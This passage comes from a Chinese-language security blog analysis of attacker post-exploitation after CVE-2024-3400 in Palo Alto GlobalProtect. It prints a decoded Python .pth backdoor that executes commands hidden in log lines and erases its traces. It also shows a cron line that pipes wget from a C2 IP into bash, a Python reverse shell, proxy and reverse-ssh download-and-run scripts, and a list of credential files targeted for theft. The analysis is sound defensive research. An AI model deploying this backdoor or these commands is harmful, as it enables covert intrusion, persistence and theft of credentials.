dlcy9zeXN0ZW0ucHRoIgogICAgY29udGVudCA9IG9wZW4oc3lzdGVtcHRoKS5yZWFkKCkKICAgICMgb3MudW5saW5rKF9fZmlsZV9fKQogICAgZGVmIHN0b3Aoc2lnLGZyYW1lKToKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoc3lzdGVtcHRoKToKICAgICAgICAgICAgd2l0aCBvcGVuKHN5c3RlbXB0aCwidyIpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGNvbnRlbnQpCgogICAgc2lnbmFsLnNpZ25hbChzaWduYWwuU0lHVEVSTSxzdG9wKQoKCnByb3RlY3QoKQpjaGVjaygpCg=="))'''</span>)</span><br><span class="line">atime=os.path.getatime(os.__file__)</span><br><span class="line">mtime=os.path.getmtime(os.__file__)</span><br><span class="line">os.utime(systempth,(atime,mtime))</span><br><span class="line">os.unlink(__file__)</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line">os.unlink(glob.glob(<span class="string">"/opt/pancfg/mgmt/licenses/PA_VM`*"</span>)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<p>这里把一段 Python 代码写入了 <code>/usr/lib/python3.6/site-packages/system.pth</code>。</p>
<blockquote>
<p>The purpose of the update.py script is to deploy a backdoor to the following path: <code>/usr/lib/python3.6/site-packages/system.pth</code>. The backdoor, written in Python, starts by an <code>import</code> and its main content is stored as a base64 encoded blob. The <code>.pth</code> extension is used to append additional paths to a Python module. Starting with the release of Python 3.5, lines in <code>.pth</code> files beginning with the text “<code>import</code>” followed by a space or a tab, are executed as described in the <a href="https://docs.python.org/3/library/site.html" target="_blank" rel="noopener">official documentation</a>. Therefore, by creating this file, each time any other code on the device attempts to import the module, the malicious code is executed.</p>
</blockquote>
<p>位于 Python <code>site-packages</code> 目录下的 <code>.pth</code> 文件，可以用于指定 <code>PATH</code> 路径。例如，如果 <code>.pth</code> 文件包含以下内容，则每一行指定的路径将被添加到 <code>sys.path</code> 中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\\Windows\\System32</span><br><span class="line">D:\\</span><br></pre></td></tr></table></figure>
<p>而如果 <code>.pth</code> 文件中的行以 <code>import</code> 加上空格或者制表符开头，则这一行的内容会被当做 Python 代码来执行。需要注意的是，<strong>每次 Python 进程启动时</strong>，<code>.pth</code> 文件中的内容都会被解析，而非 Volexity 原文中所说的只有在 <code>import</code> <code>.pth</code> 模块时才会解析文件。</p>
<p>Base64 解码后的内容如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> os,subprocess,time,sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_process</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">import</span> base64</span><br><span class="line">        functioncode = <span class="string">b"ZGVmIF9fbWFpbigpOg0KICAgIGltcG9ydCB0aHJlYWRpbmcsdGltZSxvcyxyZSxiYXNlNjQNCg0KDQoNCiAgICBkZWYgcmVzdG9yZShjc3NfcGF0aCxjb250ZW50LGF0aW1lLG10aW1lKToNCiAgICAgICAgaW1wb3J0IG9zLHRpbWUNCiAgICAgICAgdGltZS5zbGVlcCgxNSkNCiAgICAgICAgd2l0aCBvcGVuKGNzc19wYXRoLCd3JykgYXMgZjoNCiAgICAgICAgICAgIGYud3JpdGUoY29udGVudCkNCiAgICAgICAgb3MudXRpbWUoY3NzX3BhdGgsKGF0aW1lLG10aW1lKSkNCiAgICAgICAgDQoNCiAgICAgICAgDQogICAgZGVmIF9faXNfd2hvbGVfaG91cigpOg0KICAgICAgICBmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQ0KICAgICAgICBjdXJyZW50X3RpbWUgPSBkYXRldGltZS5ub3coKS50aW1lKCkNCiAgICAgICAgcmV0dXJuIGN1cnJlbnRfdGltZS5taW51dGUgIT0gMCBhbmQgY3VycmVudF90aW1lLnNlY29uZCA9PSAwDQogICAgY3NzX3BhdGggPSAnL3Zhci9hcHB3ZWIvc3NsdnBuZG9jcy9nbG9iYWwtcHJvdGVjdC9wb3J0YWwvY3NzL2Jvb3RzdHJhcC5taW4uY3NzJw0KICAgIGNvbnRlbnQgPSBvcGVuKGNzc19wYXRoKS5yZWFkKCkNCiAgICBhdGltZT1vcy5wYXRoLmdldGF0aW1lKGNzc19wYXRoKQ0KICAgIG10aW1lPW9zLnBhdGguZ2V0bXRpbWUoY3NzX3BhdGgpDQoNCiAgICB3aGlsZSBUcnVlOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBTSEVMTF9QQVRURVJOID0gJ2ltZ1xbKFthLXpBLVowLTkrLz1dKylcXScNCiAgICAgICAgICAgIGxpbmVzID0gW10NCiAgICAgICAgICAgIFdSSVRFX0ZMQUcgPSBGYWxzZQ0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gb3BlbigiL3Zhci9sb2cvcGFuL3NzbHZwbl9uZ3hfZXJyb3IubG9nIixlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpOg0KICAgICAgICAgICAgICAgIHJzdCA9IHJlLnNlYXJjaChTSEVMTF9QQVRURVJOLGxpbmUpDQogICAgICAgICAgICAgICAgaWYgcnN0Og0KICAgICAgICAgICAgICAgICAgICBXUklURV9GTEFHID0gVHJ1ZQ0KICAgICAgICAgICAgICAgICAgICBjbWQgPSBiYXNlNjQuYjY0ZGVjb2RlKHJzdC5ncm91cCgxKSkuZGVjb2RlKCkNCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0ID0gb3MucG9wZW4oY21kKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3Blbihjc3NfcGF0aCwiYSIpIGFzIGY6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZSgiLyoiK291dHB1dCsiKi8iKQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgICAgICAgICBwYXNzDQoNCiAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgICAgICBsaW5lcy5hcHBlbmQobGluZSkNCiAgICAgICAgICAgIGlmIFdSSVRFX0ZMQUc6DQogICAgICAgICAgICAgICAgYXRpbWU9b3MucGF0aC5nZXRhdGltZSgiL3Zhci9sb2cvcGFuL3NzbHZwbl9uZ3hfZXJyb3IubG9nIikNCiAgICAgICAgICAgICAgICBtdGltZT1vcy5wYXRoLmdldG10aW1lKCIvdmFyL2xvZy9wYW4vc3NsdnBuX25neF9lcnJvci5sb2ciKQ0KDQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKCIvdmFyL2xvZy9wYW4vc3NsdnBuX25neF9lcnJvci5sb2ciLCJ3IikgYXMgZjoNCiAgICAgICAgICAgICAgICAgICAgZi53cml0ZWxpbmVzKGxpbmVzKQ0KICAgICAgICAgICAgICAgIG9zLnV0aW1lKCIvdmFyL2xvZy9wYW4vc3NsdnBuX25neF9lcnJvci5sb2ciLChhdGltZSxtdGltZSkpDQogICAgICAgICAgICAgICAgaW1wb3J0IHRocmVhZGluZw0KICAgICAgICAgICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXJlc3RvcmUsYXJncz0oY3NzX3BhdGgsY29udGVudCxhdGltZSxtdGltZSkpLnN0YXJ0KCkNCiAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgcGFzcw0KICAgICAgICB0aW1lLnNsZWVwKDIpDQoNCg0KaW1wb3J0IHRocmVhZGluZyx0aW1lDQp0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1fX21haW4pLnN0YXJ0KCkNCg0K"</span></span><br><span class="line">        exec(base64.b64decode(functioncode))        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b"/usr/local/bin/monitor mp"</span> <span class="keyword">in</span> open(<span class="string">"/proc/self/cmdline"</span>,<span class="string">"rb"</span>).read().replace(<span class="string">b"\x00"</span>,<span class="string">b" "</span>) :</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            start_process()</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">protect</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> os,signal</span><br><span class="line">    systempth = <span class="string">"/usr/lib/python3.6/site-packages/system.pth"</span></span><br><span class="line">    content = open(systempth).read()</span><br><span class="line">    <span class="comment"># os.unlink(__file__)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stop</span><span class="params">(sig,frame)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(systempth):</span><br><span class="line">            <span class="keyword">with</span> open(systempth,<span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(content)</span><br><span class="line"></span><br><span class="line">    signal.signal(signal.SIGTERM,stop)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">protect()</span><br><span class="line">check()</span><br></pre></td></tr></table></figure>
<p>这里定义了两个函数，<code>protect</code> 用于守护 <code>/usr/lib/python3.6/site-packages/system.pth</code>，而 <code>check</code> 的核心逻辑仍然是 Base64 编码的，解码后的内容如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> threading,time,os,re,base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">restore</span><span class="params">(css_path,content,atime,mtime)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> os,time</span><br><span class="line">        time.sleep(<span class="number">15</span>)</span><br><span class="line">        <span class="keyword">with</span> open(css_path,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line">        os.utime(css_path,(atime,mtime))</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__is_whole_hour</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">        current_time = datetime.now().time()</span><br><span class="line">        <span class="keyword">return</span> current_time.minute != <span class="number">0</span> <span class="keyword">and</span> current_time.second == <span class="number">0</span></span><br><span class="line">    css_path = <span class="string">'/var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css'</span></span><br><span class="line">    content = open(css_path).read()</span><br><span class="line">    atime=os.path.getatime(css_path)</span><br><span class="line">    mtime=os.path.getmtime(css_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            SHELL_PATTERN = <span class="string">'img\[([a-zA-Z0-9+/=]+)\]'</span></span><br><span class="line">            lines = []</span><br><span class="line">            WRITE_FLAG = <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"/var/log/pan/sslvpn_ngx_error.log"</span>,errors=<span class="string">"ignore"</span>).readlines():</span><br><span class="line">                rst = re.search(SHELL_PATTERN,line)</span><br><span class="line">                <span class="keyword">if</span> rst:</span><br><span class="line">                    WRITE_FLAG = <span class="keyword">True</span></span><br><span class="line">                    cmd = base64.b64decode(rst.group(<span class="number">1</span>)).decode()</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        output = os.popen(cmd).read()</span><br><span class="line">                        <span class="keyword">with</span> open(css_path,<span class="string">"a"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                            f.write(<span class="string">"/*"</span>+output+<span class="string">"*/"</span>)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                lines.append(line)</span><br><span class="line">            <span class="keyword">if</span> WRITE_FLAG:</span><br><span class="line">                atime=os.path.getatime(<span class="string">"/var/log/pan/sslvpn_ngx_error.log"</span>)</span><br><span class="line">                mtime=os.path.getmtime(<span class="string">"/var/log/pan/sslvpn_ngx_error.log"</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">"/var/log/pan/sslvpn_ngx_error.log"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.writelines(lines)</span><br><span class="line">                os.utime(<span class="string">"/var/log/pan/sslvpn_ngx_error.log"</span>,(atime,mtime))</span><br><span class="line">                <span class="keyword">import</span> threading</span><br><span class="line">                threading.Thread(target=restore,args=(css_path,content,atime,mtime)).start()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading,time</span><br><span class="line">threading.Thread(target=__main).start()</span><br></pre></td></tr></table></figure>
<p>这段代码用于建立一个后门来执行攻击者发送的命令：</p>
<ul>
<li>请求一个不存在的页面，请求参数中带入要执行的命令</li>
<li>由于页面不存在，相关信息会被写入日志文件 <code>/var/log/pan/sslvpn_ngx_error.log</code></li>
<li>从日志文件 <code>/var/log/pan/sslvpn_ngx_error.log</code> 提取攻击者指定的命令</li>
<li>通过 <code>os.popen</code> 执行命令，并将命令输出信息写入 CSS 文件 <code>/var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css</code></li>
<li>恢复日志文件 <code>/var/log/pan/sslvpn_ngx_error.log</code> 的文件内容（去除了带命令参数的内容）以及 <code>atime</code> 和 <code>mtime</code> 属性</li>
<li>恢复 CSS 文件 <code>/var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css</code> 的文件内容以及 <code>atime</code> 和 <code>mtime</code> 属性<ul>
<li>但这里的 <code>atime</code> 和 <code>mtime</code> 其实来自日志文件，并非之前保存的 CSS 文件的原始时间属性</li>
</ul>
</li>
</ul>
<p>攻击者可以在恢复文件前的 <code>15</code> 秒时间间隙内通过 CSS 文件读取命令执行结果。</p>
<h3 id="3-2-patch-cron-file"><a href="#3-2-patch-cron-file" class="headerlink" title="3.2 patch cron file"></a>3.2 patch cron file</h3><p>创建 crontab 任务定期从 C2 服务器拉取名为 <code>policy</code> 的脚本执行。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ ! -f '/etc/cron.d/update' ]; then</span><br><span class="line">    printf "SHELL=/bin/bash\n\n* * * * * root wget -qO- http://172.233.228[.]93/policy | bash\n\n" &gt; /etc/cron.d/update</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<h3 id="3-3-policy-file"><a href="#3-3-policy-file" class="headerlink" title="3.3 policy file"></a>3.3 policy file</h3><h4 id="3-3-1-Version-1"><a href="#3-3-1-Version-1" class="headerlink" title="3.3.1 Version 1"></a>3.3.1 Version 1</h4><p>Python 反弹 Shell。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">r=`ps -ef | grep "import sys,socket,os" | grep -v grep`</span><br><span class="line">if [[ -z "$r" ]]; then</span><br><span class="line">    python -c "import sys,socket,os,pty;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(('172.233.228[.]93',443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/bash')"</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<h4 id="3-3-2-Version-2"><a href="#3-3-2-Version-2" class="headerlink" title="3.3.2 Version 2"></a>3.3.2 Version 2</h4><p>将 <code>uname -a</code> 的输出信息写入 CSS 文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">rm -f /var/appweb/sslvpndocs/global-protect/*.css</span><br><span class="line">cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/&lt;redacted&gt;.css</span><br><span class="line">uname -a &gt; /var/appweb/sslvpndocs/global-protect/&lt;redacted&gt;.css</span><br></pre></td></tr></table></figure>
<h4 id="3-3-3-Version-3"><a href="#3-3-3-Version-3" class="headerlink" title="3.3.3 Version 3"></a>3.3.3 Version 3</h4><p>清理 CSS 文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">rm -f /var/appweb/sslvpndocs/global-protect/*.css</span><br></pre></td></tr></table></figure>
<h4 id="3-3-4-Version-4"><a href="#3-3-4-Version-4" class="headerlink" title="3.3.4 Version 4"></a>3.3.4 Version 4</h4><p>下载执行 <a href="https://github.com/ginuerzh/gost" target="_blank" rel="noopener">GOST</a> 代理。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">wget http://172.233.228[.]93/vpn_prot.gz -O /tmp/vpn_prot.gz</span><br><span class="line">ls -l /tmp/vpn_prot.gz &gt; /var/appweb/sslvpndocs/global-protect/u.css</span><br><span class="line">gzip -d /tmp/vpn_prot.gz</span><br><span class="line">chmod +x /tmp/vpn_prot</span><br><span class="line">nohup /tmp/vpn_prot -L=socks5://127.0.0[.]1:8123 &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">nohup /tmp/vpn_prot -L rtcp://127.0.0[.]1:8080/127.0.0[.]1:8123 -F ssh://user0:[password_redacted]@172.233.228[.]93:8443?ping=180 &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<h4 id="3-3-5-Version-5"><a href="#3-3-5-Version-5" class="headerlink" title="3.3.5 Version 5"></a>3.3.5 Version 5</h4><p>Version 4 的改良版本（Base64 编码）。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">wget http://172.233.228[.]93/vpn.log -O /tmp/vpn.log</span><br><span class="line">base64 -d /tmp/vpn.log &gt; /tmp/vpn_prot.gz</span><br><span class="line">ls -l /tmp/vpn_prot.gz &gt; /var/appweb/sslvpndocs/global-protect/u.css</span><br><span class="line">gzip -d /tmp/vpn_prot.gz</span><br><span class="line">chmod +x /tmp/vpn_prot</span><br><span class="line">nohup /tmp/vpn_prot -L=socks5://127.0.0[.]1:8123 &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">nohup /tmp/vpn_prot -L rtcp://127.0.0[.]1:8080/127.0.0.1:8123 -F ssh://user0:[password_redacted]@172.233.228[.]93:8443?ping=180 &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<h4 id="3-3-6-Version-6"><a href="#3-3-6-Version-6" class="headerlink" title="3.3.6 Version 6"></a>3.3.6 Version 6</h4><p>下载执行基于 SSH 的反弹 Shell <a href="https://github.com/Fahrj/reverse-ssh" target="_blank" rel="noopener">reverse-ssh</a>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">wget http://172.233.228[.]93/lowdp -O /tmp/lowdp</span><br><span class="line">ls -l /tmp/lowdp &gt; /var/appweb/sslvpndocs/global-protect/u.css</span><br><span class="line">chmod +x /tmp/lowdp</span><br><span class="line">nohup /tmp/lowdp -l -p 31289 &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<h3 id="3-4-Lateral-Movement-amp-Data-theft"><a href="#3-4-Lateral-Movement-amp-Data-theft" class="headerlink" title="3.4 Lateral Movement &amp; Data theft"></a>3.4 Lateral Movement &amp; Data theft</h3><p>信息收集及窃取。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data</span><br><span class="line">%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network</span><br><span class="line">%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies</span><br><span class="line">%LOCALAPPDATA%\Google\Chrome\User Data\Local State</span><br><span class="line">%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data</span><br><span class="line">%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network</span><br><span class="line">%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies</span><br><span class="line">%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State</span><br><span class="line">%APPDATA%\Roaming\Microsoft\Protect\&lt;SID&gt; -&gt; DPAPI Keys</span><br><span class="line">%SystemRoot%\NTDS\ntds.dit</span><br><span class="line">%SystemRoot%\System32\winevt\Logs\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx</span><br></pre></td></tr></table></figure>
<h2 id="0x04-References"><a href="#0x04-References" class="headerlink" title="0x04. References"></a>0x04. References</h2><ol>
<li><a href="https://security.paloaltonetworks.com/CVE-2024-3400" target="_blank" rel="noopener">https://security.paloaltonetworks.com/CVE-2024-3400</a></li>
<li><a href="https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/" target="_blank" rel="noopener">https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/</a></li>
<li><a href="https://www.sprocketsecurity.com/resources/patch-diffing-cve-2024-3400-from-a-palo-alto-ngfw-marketplace-ami" target="_blank" rel="noopener">https://www.sprocketsecurity.com/resources/patch-diffing-cve-2024-3400-from-a-palo-alto-ngfw-marketplace-ami</a></li>
<li><a href="https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis" target="_blank" rel="noopener">https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis</a></li>
<li><a href="https://github.com/gorilla/sessions/pull/274" target="_blank" rel="noopener">https://github.com/gorilla/sessions/pull/274</a></li>
<li><a href="https://bishopfox.com/blog/pan-os-cve-2024-3400-patch-your-palo-alto-firewalls" target="_blank" rel="noopener">https://bishopfox.com/blog/pan-os-cve-2024-3400-patch-your-palo-alto-firewalls</a></li>
<li><a href="https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/" target="_blank" rel="noopener">https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/</a></li>
<li><a href="https://bazaar.abuse.ch/sample/3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac/" target="_blank" rel="noopener">https://bazaar.abuse.ch/sample/3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac/</a></li>
</ol>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>请作者喝杯咖啡☕</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>Donate</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/uploads/wechatpay.jpg" alt="Ke Liu WeChat Pay">
        <p>WeChat Pay</p>
      </div>
    

    

    

  </div>
</div>

      </div>
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Path-Traversal/" rel="tag"># Path Traversal</a>
          
            <a href="/tags/Command-Injection/" rel="tag"># Command Injection</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2024/04/14/cve-2024-24576-rust-command-injection-vulnerability/" rel="next" title="CVE-2024-24576 Windows 下多语言命令注入漏洞分析">
                <i class="fa fa-chevron-left"></i> CVE-2024-24576 Windows 下多语言命令注入漏洞分析
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2024/05/26/cve-2024-33899-winrar-escape-sequence-injection-vulnerability/" rel="prev" title="CVE-2024-33899 WinRAR RAR/UnRAR Escape Sequence 注入漏洞">
                CVE-2024-33899 WinRAR RAR/UnRAR Escape Sequence 注入漏洞 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            Overview
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/uploads/avatar.webp" alt="Ke Liu">
          <p class="site-author-name" itemprop="name">Ke Liu</p>
           
              <p class="site-description motion-element" itemprop="description">Independent Security Researcher</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives/">
                <span class="site-state-item-count">29</span>
                <span class="site-state-item-name">posts</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">17</span>
                <span class="site-state-item-name">categories</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">72</span>
                <span class="site-state-item-name">tags</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://twitter.com/klotxl404" target="_blank" title="Twitter">
                  
                    <i class="fa fa-fw fa-twitter"></i>
                  
                    
                      Twitter
                    
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-漏洞简介"><span class="nav-text">0x01. 漏洞简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-漏洞细节"><span class="nav-text">0x02. 漏洞细节</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-漏洞信息"><span class="nav-text">2.1 漏洞信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Cookie-路径穿越"><span class="nav-text">2.2 Cookie 路径穿越</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Telemetry-命令注入"><span class="nav-text">2.3 Telemetry 命令注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-组合利用"><span class="nav-text">2.4 组合利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-其他说明"><span class="nav-text">2.5 其他说明</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Post-Exploitation"><span class="nav-text">0x03. Post-Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-update-py-backdoor"><span class="nav-text">3.1 update.py backdoor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-patch-cron-file"><span class="nav-text">3.2 patch cron file</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-policy-file"><span class="nav-text">3.3 policy file</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-1-Version-1"><span class="nav-text">3.3.1 Version 1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-2-Version-2"><span class="nav-text">3.3.2 Version 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-3-Version-3"><span class="nav-text">3.3.3 Version 3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-4-Version-4"><span class="nav-text">3.3.4 Version 4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-5-Version-5"><span class="nav-text">3.3.5 Version 5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-6-Version-6"><span class="nav-text">3.3.6 Version 6</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-Lateral-Movement-amp-Data-theft"><span class="nav-text">3.4 Lateral Movement &amp; Data theft</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-References"><span class="nav-text">0x04. References</span></a></li></ol></div>
            

          </div>
